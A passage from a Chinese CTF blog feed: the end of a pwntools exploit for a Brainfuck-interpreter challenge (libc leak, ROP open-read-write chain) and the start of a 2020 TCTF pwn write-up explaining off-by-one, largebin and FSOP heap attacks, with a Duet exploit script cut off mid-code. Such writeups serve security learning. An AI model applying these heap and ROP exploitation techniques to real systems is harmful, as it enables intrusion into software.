string">'-h'</span><span class="token punctuation">]</span>debug <span class="token operator">=</span> <span class="token number">1</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'./bf'</span><span class="token punctuation">)</span>libc_offset <span class="token operator">=</span> <span class="token number">0x3c4b20</span>gadgets <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">0x45216</span><span class="token punctuation">,</span><span class="token number">0x4526a</span><span class="token punctuation">,</span><span class="token number">0xf02a4</span><span class="token punctuation">,</span><span class="token number">0xf1147</span><span class="token punctuation">]</span><span class="token keyword">if</span> debug<span class="token punctuation">:</span>    libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'libc.so.6'</span><span class="token punctuation">)</span>    p <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">'./bf'</span><span class="token punctuation">)</span><span class="token keyword">else</span><span class="token punctuation">:</span>    libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'./x64_libc.so.6'</span><span class="token punctuation">)</span>    p <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'f.buuoj.cn'</span><span class="token punctuation">,</span><span class="token number">20173</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">exp</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token comment" spellcheck="true">#leak libc</span>    p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"enter your code:"</span><span class="token punctuation">)</span>    payload <span class="token operator">=</span> <span class="token string">'+[>+],.'</span>    <span class="token comment" spellcheck="true">#gdb.attach(p,'b* 0x555555554000+0x1d2b')</span>    p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>    raw_input<span class="token punctuation">(</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string">"\x68"</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"done! your code: "</span><span class="token punctuation">)</span>    libc_base <span class="token operator">=</span> u64<span class="token punctuation">(</span>p<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token string">'\n'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token string">'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">231</span> <span class="token operator">-</span> libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'__libc_start_main'</span><span class="token punctuation">]</span>    log<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string">"libc base => "</span> <span class="token operator">+</span> hex<span class="token punctuation">(</span>libc_base<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#make rops</span>    p_rdi <span class="token operator">=</span> libc_base <span class="token operator">+</span> <span class="token number">0x000000000002155f</span>    p_rsi <span class="token operator">=</span> libc_base <span class="token operator">+</span> <span class="token number">0x0000000000023e6a</span>    p_rdx <span class="token operator">=</span> libc_base <span class="token operator">+</span> <span class="token number">0x0000000000001b96</span>    p_rax <span class="token operator">=</span> libc_base <span class="token operator">+</span> <span class="token number">0x00000000000439c8</span>    syscall <span class="token operator">=</span> libc_base <span class="token operator">+</span> <span class="token number">0x00000000000d2975</span>    flag_addr <span class="token operator">=</span> libc_base <span class="token operator">+</span> libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'__malloc_hook'</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">0x200</span>    rops <span class="token operator">=</span> flat<span class="token punctuation">(</span><span class="token punctuation">[</span>            <span class="token comment" spellcheck="true">#read flag into libc</span>            p_rdi<span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span>            p_rsi<span class="token punctuation">,</span>flag_addr<span class="token punctuation">,</span>            p_rdx<span class="token punctuation">,</span><span class="token number">0x8</span><span class="token punctuation">,</span>            p_rax<span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span>            syscall<span class="token punctuation">,</span>            <span class="token comment" spellcheck="true">#open</span>            p_rdi<span class="token punctuation">,</span>flag_addr<span class="token punctuation">,</span>            p_rsi<span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span>            p_rdx<span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span>            p_rax<span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span>            syscall<span class="token punctuation">,</span>            <span class="token comment" spellcheck="true">#read</span>            p_rdi<span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span>            p_rsi<span class="token punctuation">,</span>flag_addr<span class="token operator">+</span><span class="token number">0x20</span><span class="token punctuation">,</span>            p_rdx<span class="token punctuation">,</span><span class="token number">0x20</span><span class="token punctuation">,</span>            p_rax<span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span>            syscall<span class="token punctuation">,</span>            <span class="token comment" spellcheck="true">#write</span>            p_rdi<span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span>            p_rsi<span class="token punctuation">,</span>flag_addr<span class="token operator">+</span><span class="token number">0x20</span><span class="token punctuation">,</span>            p_rdx<span class="token punctuation">,</span><span class="token number">0x20</span><span class="token punctuation">,</span>            p_rax<span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span>            syscall        <span class="token punctuation">]</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"want to continue?"</span><span class="token punctuation">)</span>    payload <span class="token operator">=</span> <span class="token string">'y'</span><span class="token operator">+</span>rops   <span class="token comment" spellcheck="true"># 解析到这个位置的时候只会++，不过运气比较好，没有上述可以解析的指令</span>    payload <span class="token operator">+=</span> <span class="token string">'+[>+],.'</span> <span class="token comment" spellcheck="true"># 最后会解析到这里</span>    <span class="token comment" spellcheck="true">#gdb.attach(p)</span>    p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>    raw_input<span class="token punctuation">(</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string">"\x30"</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"want to continue?"</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string">"n./flag"</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>exp<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> 解释器PWN </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>2020 TCTF预选赛和决赛部分PWN题复盘</title>
      <link href="/2020/10/29/2020-tctf-yu-xuan-sai-he-jue-sai-bu-fen-pwn-ti-fu-pan/"/>
      <url>/2020/10/29/2020-tctf-yu-xuan-sai-he-jue-sai-bu-fen-pwn-ti-fu-pan/</url>
      
        <content type="html"><![CDATA[<h1 id="Summary"><a href="#Summary" class="headerlink" title="Summary"></a>Summary</h1><p><strong>Duet</strong>：沙箱+off by one 2.29：</p><p>思路一：利用off by one进行overlapping，构造A可以改写B的header，最终目标是UAF泄露出libc和heap base，以及largebin attack攻击。伪造io file调用io_str_oveflow中的malloc和free函数。来劫持free_hook，执行ORW读取flag</p><p>思路二：利用tcache stashing unlink修改global_max_fast使用fastbin attack，为造出fake chunk和fake list，令其可以分配到main_arena上。free_hook-0xb68有0x100可作为suze，将top chunk改到这里，伪造一个fake top chunk size，通过几次分配劫持到free_hook，布置好rop利用rdi进行迁移栈。</p><p><strong>simple_server</strong>：非栈上的格式化字符串，不用泄露，劫持ebp链，令其leave ret的时候返回到指定的rsp位置，该位置提前用%*n读出libc地址，再第四位写入one_gadget来getshell。</p><p><strong>babyheap</strong>: 2.31 off by null，通过largebin和fastbin残留的heap地址来修改后一位，绕过unlink判断，劫持hook。</p><h1 id="初赛-Duet"><a href="#初赛-Duet" class="headerlink" title="初赛-Duet"></a>初赛-Duet</h1><h2 id="查看文件"><a href="#查看文件" class="headerlink" title="查看文件"></a>查看文件</h2><div style="width:70%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2020/10/29/2020-tctf-yu-xuan-sai-he-jue-sai-bu-fen-pwn-ti-fu-pan/0.png"></div>保护全开，同时开启沙箱<h2 id="IDA分析"><a href="#IDA分析" class="headerlink" title="IDA分析"></a>IDA分析</h2><p>拖到IDA发现PLT表损坏，导致函数不能正常识别，借鉴了LYYL师傅的恢复办法<a href="https://www.lyyl.online/2020/10/02/%E4%B8%80%E7%A7%8D%E4%BF%AE%E5%A4%8DIDA%E5%9C%A8%E5%88%86%E6%9E%90Binary%E6%96%87%E4%BB%B6%E6%97%B6%E5%87%BA%E7%8E%B0%E7%9A%84PLT%E8%A1%A8%E6%8D%9F%E5%9D%8F%E6%8A%A5%E9%94%99%E7%9A%84%E6%96%B9%E6%B3%95/" target="_blank" rel="noopener">一种修复IDA在分析Binary文件时出现的PLT表损坏报错的方法</a></p><p>恢复之后就好逆多了：<br>四个功能：create、show、edit、delete。只能存储两个堆块指针，限制分配0x80~0x400大小的size并且只能用calloc。只能使用一次edit，off by one：</p><div style="width:70%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2020/10/29/2020-tctf-yu-xuan-sai-he-jue-sai-bu-fen-pwn-ti-fu-pan/1.png"></div><h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><p>通过学习师傅们的WP得知这道题目有两个思路：</p><h3 id="思路一：通过FSOP"><a href="#思路一：通过FSOP" class="headerlink" title="思路一：通过FSOP"></a>思路一：通过FSOP</h3><p>1.利用off by one进行overlapping，构造A可以改写B的header，最终目标是UAF泄露出libc和heap base，以及largebin attack攻击。</p><p>这里需要讲讲largebin attack攻击：2.29下有tcache机制也就和原来的触发largebin attack的分配策略不一样了。大致是chunk A在largebin中，此时chunk B（&gt;A）在unsorted bin中，此时malloc一个大于fastbin的chunk时就会进行chunk归类，将B归入largebin，而不是像以前必须malloc大于B的chunk。还有一点是bk_size+0x20 = 释放进largebin chunk的头部地址。</p><p>2.largebin attack的目标是将io_list_all或stderr-&gt;chain改为heap地址（fake io<br> file）。注意到2.29中虚函数基本都改为调用某个函数，之前也了解过，导致难以直接劫持控制流，我们注意到IO_str_overflow函数中有malloc和free，详细看看里面的参数其实是可以控制的。</p><div style="width:70%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2020/10/29/2020-tctf-yu-xuan-sai-he-jue-sai-bu-fen-pwn-ti-fu-pan/2.png"></div><p>要注意这么几个绕过条件：<br>首先是调用vtable+0x18处虚函数的条件：（还需注意一点vtable需要改一下）</p><pre class="line-numbers language-c"><code class="language-c"><span class="token number">1</span><span class="token punctuation">.</span> <span class="token punctuation">(</span>fp<span class="token operator">-></span>mode<span class="token operator">&lt;=</span><span class="token number">0</span><span class="token operator">&amp;&amp;</span>fp<span class="token operator">-></span>write_ptr<span class="token operator">></span>fp<span class="token operator">-></span>write_base<span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token punctuation">(</span><span class="token function">_IO_vtable_offset</span> <span class="token punctuation">(</span>fp<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0</span> <span class="token operator">&amp;&amp;</span> fp<span class="token operator">-></span>_mode <span class="token operator">></span> <span class="token number">0</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span>fp<span class="token operator">-></span>_wide_data<span class="token operator">-></span>_IO_write_ptr <span class="token operator">></span> fp<span class="token operator">-></span>_wide_data<span class="token operator">-></span>_IO_write_base<span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>其次是malloc和free的条件：</p><pre class="line-numbers language-c"><code class="language-c"><span class="token punctuation">(</span>fp<span class="token operator">-></span>_flags <span class="token operator">&amp;</span> _IO_NO_WRITES<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token function">FALSE</span><span class="token punctuation">(</span>fp<span class="token operator">-></span>_IO_write_ptr <span class="token operator">-</span> fp<span class="token operator">-></span>_IO_write_base<span class="token punctuation">)</span> <span class="token operator">></span> <span class="token punctuation">(</span>fp<span class="token punctuation">)</span><span class="token operator">-></span>_IO_buf_end <span class="token operator">-</span> <span class="token punctuation">(</span>fp<span class="token punctuation">)</span><span class="token operator">-></span>_IO_buf_basefp<span class="token operator">-></span>_IO_buf_base <span class="token operator">!=</span> <span class="token constant">NULL</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>我们之前通过overlapping将0x310 tcache链的fd改为，free_hook，大致是（A-&gt;B-&gt;free_hook）<br>所以这里我们只要精心构造fake io结构体，令malloc的参数为0x300就可以分配tcache的0x310的chunk。同时memcpy参数也可控，由于后面有free，那么就直接在chunk中伪造一个fake chunk这样才可以再后面正常释放。</p><p>由于我们需要三次才能分配到free_hook，那么就需要伪造三个io file结构体。这样进行索引的时候会调用三次io_str_overflow来进行一系列的malloc和free，最后free_hook写特殊gadgets</p><pre class="line-numbers language-c"><code class="language-c"># <span class="token number">0x0000000000150550</span><span class="token punctuation">:</span> mov rdx<span class="token punctuation">,</span> qword ptr <span class="token punctuation">[</span>rdi <span class="token operator">+</span> <span class="token number">8</span><span class="token punctuation">]</span><span class="token punctuation">;</span> mov qword ptr <span class="token punctuation">[</span>rsp<span class="token punctuation">]</span><span class="token punctuation">,</span> rax<span class="token punctuation">;</span> call qword ptr <span class="token punctuation">[</span>rdx <span class="token operator">+</span> <span class="token number">0x20</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>后面接着写setcontext+0x35，程序流跳入提前布置好的ORW ROP，这样就可以成功读出flag</p><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><pre class="line-numbers language-python"><code class="language-python"><span class="token comment" spellcheck="true"># encoding=utf-8</span><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">.</span>update<span class="token punctuation">(</span>os<span class="token operator">=</span><span class="token string">"linux"</span><span class="token punctuation">,</span>arch<span class="token operator">=</span><span class="token string">"amd64"</span><span class="token punctuation">,</span>log_level<span class="token operator">=</span><span class="token string">"debug"</span><span class="token punctuation">)</span>context<span class="token punctuation">.</span>terminal <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'tmux'</span><span class="token punctuation">,</span> <span class="token string">'split'</span><span class="token punctuation">,</span> <span class="token string">'-h'</span><span class="token punctuation">]</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"./duet"</span><span class="token punctuation">)</span>debug <span class="token operator">=</span> <span class="token number">1</span><span class="token keyword">if</span> debug<span class="token punctuation">:</span>    p <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">"./duet"</span><span class="token punctuation">)</span>    libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'/lib/x86_64-linux-gnu/libc.so.6'</span><span class="token punctuation">)</span>    one_gadget <span class="token operator">=</span> <span class="token number">0x0</span>    <span class="token comment" spellcheck="true"># io_str_jumps = libc.sym['_IO_str_jumps']</span><span class="token keyword">else</span><span class="token punctuation">:</span>    p <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">"./duet"</span><span class="token punctuation">]</span><span class="token punctuation">)</span>    libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'/lib/x86_64-linux-gnu/libc.so.6'</span><span class="token punctuation">)</span>    one_gadget <span class="token operator">=</span> <span class="token number">0x0</span>    io_str_jumps <span class="token operator">=</span> <span class="token number">0x1e6620</span>flag <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">"琴"</span><span class="token punctuation">,</span> <span class="token string">"瑟"</span><span class="token punctuation">]</span><span class="token keyword">def</span> <span class="token function">create</span><span class="token punctuation">(</span>index<span class="token punctuation">,</span> size<span class="token punctuation">,</span> content<span class="token punctuation">)</span><span class="token punctuation">:</span>    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">": "</span><span class="token punctuation">,</span> <span class="token string">"1"</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"Instrument: "</span><span class="token punctuation">,</span> flag<span class="token punctuation">[</span>index<span class="token punctuation">]</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"Duration: "</span><span class="token punctuation">,</span> str<span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span><span class="token string">"Score: "</span><span class="token punctuation">,</span> content<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span>size<span class="token punctuation">,</span><span class="token string">"\x00"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">delete</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">:</span>    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">": "</span><span class="token punctuation">,</span> <span class="token string">"2"</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"Instrument: "</span><span class="token punctuation">,</span> flag<span class="token punctuation">[</span>index<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">show</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">:</span>    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">": "</span><span class="token punctuation">,</span> <span class="token string">"3"</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"Instrument: "</span><span class="token punctuation">,</span> flag<span class="token punctuation">[</span>index<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">edit</span><span class="token punctuation">(</span>content<span class="token punctuation">)</span><span class="token punctuation">:</span>    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">": "</span><span class="token punctuation">,</span> <span class="token string">"5"</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"合: "</span><span class="token punctuation">,</span> str<span class="token punctuation">(</span>content<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">exit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">": "</span><span class="token punctuation">,</span> <span class="token string">"6"</span><span class="token punctuation">)</span><span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    create<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">0x3f8</span><span class="token punctuation">,</span><span class="token punctuation">(</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x21</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">0x3f</span><span class="token operator">+</span><span class="token string">"a"</span><span class="token operator">*</span><span class="token number">8</span><span class="token punctuation">)</span>    delete<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    create<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">0x1e8</span><span class="token punctuation">,</span><span class="token punctuation">(</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x21</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">0x1e</span><span class="token operator">+</span><span class="token string">"a"</span><span class="token operator">*</span><span class="token number">8</span><span class="token punctuation">)</span>    delete<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    create<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0x88</span><span class="token punctuation">,</span><span class="token string">"a"</span><span class="token operator">*</span><span class="token number">0x88</span><span class="token punctuation">)</span>    delete<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>libc_static <span class="token operator">=</span> <span class="token number">0x7ffff7dce000</span>heap_static <span class="token operator">=</span> <span class="token number">0x555555559000</span>create<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0x88</span><span class="token punctuation">,</span><span class="token string">"a"</span><span class="token operator">*</span><span class="token number">0x88</span><span class="token punctuation">)</span>create<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">0xf8</span><span class="token punctuation">,</span><span class="token string">"a"</span><span class="token operator">*</span><span class="token number">0xf8</span><span class="token punctuation">)</span>delete<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>edit<span class="token punctuation">(</span><span class="token number">0xf1</span><span class="token punctuation">)</span>create<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0x1e8</span><span class="token punctuation">,</span><span class="token punctuation">(</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x21</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">0x1e</span><span class="token operator">+</span><span class="token string">"a"</span><span class="token operator">*</span><span class="token number">8</span><span class="token punctuation">)</span>delete<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>create<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">0x128</span><span class="token punctuation">,</span><span class="token string">"a"</span><span class="token operator">*</span><span class="token number">0xf0</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x1f1</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">5</span><span class="token punctuation">)</span>show<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">0x35</span><span class="token punctuation">)</span>libc<span class="token punctuation">.</span>address <span class="token operator">=</span> u64<span class="token punctuation">(</span>p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token string">"\x00"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">0x00007ffff7fb2ca0</span><span class="token operator">+</span><span class="token number">0x7ffff7dce000</span>success<span class="token punctuation">(</span><span class="token string">"libc address ==> "</span><span class="token operator">+</span>hex<span class="token punctuation">(</span>libc<span class="token punctuation">.</span>address<span class="token punctuation">)</span><span class="token punctuation">)</span>delete<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>create<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">0x300</span><span class="token punctuation">,</span><span class="token punctuation">(</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x21</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">0x30</span><span class="token punctuation">)</span>delete<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>create<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">0x300</span><span class="token punctuation">,</span><span class="token punctuation">(</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x21</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">0x30</span><span class="token punctuation">)</span>delete<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>delete<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>create<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0xb8</span><span class="token punctuation">,</span><span class="token string">"a"</span><span class="token operator">*</span><span class="token number">0xb8</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true"># large bin attack and leak heap base</span><span class="token comment" spellcheck="true"># leak heap addr</span>create<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">0x1e8</span><span class="token punctuation">,</span><span class="token string">"a"</span><span class="token operator">*</span><span class="token number">0x20</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x401</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">"a"</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token number">0x1e8</span><span class="token operator">-</span><span class="token number">0x30</span><span class="token punctuation">)</span><span class="token punctuation">)</span>delete<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>create<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0x400</span><span class="token punctuation">,</span><span class="token string">"a"</span><span class="token operator">*</span><span class="token number">0x400</span><span class="token punctuation">)</span>show<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">0x45</span><span class="token punctuation">)</span>heap_base <span class="token operator">=</span> u64<span class="token punctuation">(</span>p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token string">"\x00"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">0x000055555555c190</span><span class="token operator">+</span><span class="token number">0x555555559000</span>success<span class="token punctuation">(</span><span class="token string">"heap base ==> "</span><span class="token operator">+</span>hex<span class="token punctuation">(</span>heap_base<span class="token punctuation">)</span><span class="token punctuation">)</span>delete<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>create<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0x3f8</span><span class="token punctuation">,</span><span class="token punctuation">(</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x21</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">0x1b</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x311</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">"__free_hook"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">"a"</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token number">0x3f8</span><span class="token operator">-</span><span class="token number">0x1b0</span><span class="token operator">-</span><span class="token number">0x18</span><span class="token punctuation">)</span><span class="token punctuation">)</span>delete<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true"># large bin attack</span>create<span class="token punctuation">(</span><span class="token number">0</span><span class="token 